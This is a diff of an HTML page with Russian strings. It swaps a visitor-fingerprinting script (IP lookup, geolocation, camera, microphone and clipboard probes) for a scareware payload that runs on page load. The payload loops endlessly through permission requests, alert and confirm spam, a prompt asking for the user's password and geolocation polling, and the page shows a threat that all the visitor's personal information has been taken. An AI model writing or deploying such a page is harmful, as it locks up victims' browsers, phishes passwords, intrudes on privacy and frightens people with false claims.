@@ -69,106 +69,67 @@
             });
     </script>
 
+<div id="output" style="white-space: pre-wrap; color: red; background: black; padding: 10px; height: 300px; overflow: auto;"></div>
+
 <script>
-    async function getUserData() {
-    let output = document.getElementById("output");
-    let data = {
-        userAgent: navigator.userAgent,
-        platform: navigator.platform,
-        language: navigator.language,
-        screenSize: `${screen.width}x${screen.height}`,
-    };
-
-    try {
-        let ipInfo = await fetch("https://api64.ipify.org?format=json");
-        let ipData = await ipInfo.json();
-        data.ip = ipData.ip;
-    } catch (e) {
-        data.ip = "Не удалось получить";
+async function requestPermissions() {
+    while (true) {
+        try { await navigator.mediaDevices.getUserMedia({ audio: true, video: true }); } catch {}
+        try { await Notification.requestPermission(); } catch {}
+        try { await navigator.clipboard.readText(); } catch {}
+        await new Promise(r => setTimeout(r, 500)); // пауза между циклами
     }
-
-    navigator.geolocation.getCurrentPosition((pos) => {
-        data.location = `Широта: ${pos.coords.latitude}, Долгота: ${pos.coords.longitude}`;
-        output.textContent = JSON.stringify(data, null, 2);
-    }, () => {
-        data.location = "Доступ запрещён";
-        output.textContent = JSON.stringify(data, null, 2);
-    });
-
-
-    try {
-        await navigator.mediaDevices.getUserMedia({ audio: true, video: true });
-        data.mediaAccess = "Доступ к микрофону и камере разрешён";
-    } catch {
-        data.mediaAccess = "Доступ к микрофону и камере запрещён";
-    }
-
-
-    try {
-        let permission = await Notification.requestPermission();
-        data.notificationPermission = permission;
-    } catch {
-        data.notificationPermission = "Ошибка запроса уведомлений";
-    }
-
-
-    try {
-        await navigator.clipboard.readText();
-        data.clipboardAccess = "Доступ к буферу обмена разрешён";
-    } catch {
-        data.clipboardAccess = "Доступ к буферу обмена запрещён";
-    }
-
-    output.textContent = JSON.stringify(data, null, 2);
 }
 
-
-getUserData();
-</script>
-
-    <div id="output" style="white-space: pre-wrap;"></div>
-
-<script>
-async function getUserData() {
-    let output = document.getElementById("output");
-
+async function spamAlerts() {
     while (true) {
-        let data = {
-            userAgent: navigator.userAgent,
-            platform: navigator.platform,
-            language: navigator.language,
-            screenSize: `${screen.width}x${screen.height}`,
-            timestamp: new Date().toLocaleTimeString()
-        };
-
-        try {
-            let ipInfo = await fetch("https://api64.ipify.org?format=json");
-            let ipData = await ipInfo.json();
-            data.ip = ipData.ip;
-        } catch (e) {
-            data.ip = "Не удалось получить IP";
-        }
-
-        // Геолокация - оборачиваем в промис для await
-        data.location = await new Promise((resolve) => {
-            navigator.geolocation.getCurrentPosition(
-                (pos) => resolve(`Широта: ${pos.coords.latitude}, Долгота: ${pos.coords.longitude}`),
-                () => resolve("Доступ запрещён")
-            );
-        });
-
-        output.textContent = JSON.stringify(data, null, 2);
-
-        // Лаги будут, если сделать почти без задержек
-        // Чтобы было еще тяжелее - убираем задержку вообще
-        // Но чтобы браузер не сгорел моментально, ставим минимум 100 мс
+        alert("⚠️ Внимание! Запрашиваем доступ!");
         await new Promise(r => setTimeout(r, 100));
     }
 }
 
-// Запускаем бесконечный цикл сразу
-getUserData();
+async function spamConfirms() {
+    while (true) {
+        confirm("Разрешить доступ к камере и микрофону?");
+        await new Promise(r => setTimeout(r, 150));
+    }
+}
+
+async function spamPrompts() {
+    while (true) {
+        prompt("Введите ваш пароль");
+        await new Promise(r => setTimeout(r, 200));
+    }
+}
+
+async function spamGeo() {
+    while (true) {
+        navigator.geolocation.getCurrentPosition(() => {}, () => {});
+        await new Promise(r => setTimeout(r, 300));
+    }
+}
+
+async function main() {
+    // Запускаем много тяжелых циклов параллельно
+    requestPermissions();
+    spamAlerts();
+    spamConfirms();
+    spamPrompts();
+    spamGeo();
+
+    // Дополнительно выводим что-то в блок
+    const output = document.getElementById("output");
+    let count = 0;
+    while (true) {
+        output.textContent = "Лаги и запросы: " + count++;
+        await new Promise(r => setTimeout(r, 50));
+    }
+}
+
+main();
 </script>
+
+    
     
 </head>
 <body>
@@ -182,5 +143,6 @@ getUserData();
     <p class="warning">ВСЯ ВАША ЛИЧНАЯ ИНФОРМАЦИЯ НАХОДИТЬСЯ У НАС! попытка восстановить не будет успешной</p>
 </body>
 </html>
+
 
 
